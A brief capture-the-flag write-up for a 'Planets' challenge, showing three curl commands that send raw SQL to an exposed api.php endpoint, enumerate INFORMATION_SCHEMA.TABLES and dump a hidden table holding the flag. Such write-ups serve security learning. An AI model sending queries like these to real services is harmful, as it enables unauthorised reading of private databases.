# Planets

Open the website <https://planets.ctf.zone/>, found the following api endpoint:

```shell
curl 'https://planets.ctf.zone/api.php' \
  --compressed \
  -X POST \
  -H 'Accept: */*' \
  -H 'Content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: https://planets.ctf.zone' \
  --data-raw 'query=SELECT * FROM planets'
```

Find all tables using INFORMATION_SCHEMA.TABLES:


```shell
curl 'https://planets.ctf.zone/api.php' \
  --compressed \
  -X POST \
  -H 'Accept: */*' \
  -H 'Content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: https://planets.ctf.zone' \
  --data-raw 'query=SELECT * FROM INFORMATION_SCHEMA.TABLES'
```

Found a table named abandoned_planets, find its rows with flags in them:

```shell
curl 'https://planets.ctf.zone/api.php' \
  --compressed \
  -X POST \
  -H 'Accept: */*' \
  -H 'Content-type: application/x-www-form-urlencoded; charset=UTF-8' \
  -H 'Origin: https://planets.ctf.zone' \
  --data-raw 'query=SELECT * FROM abandoned_planets'
```

Solved!
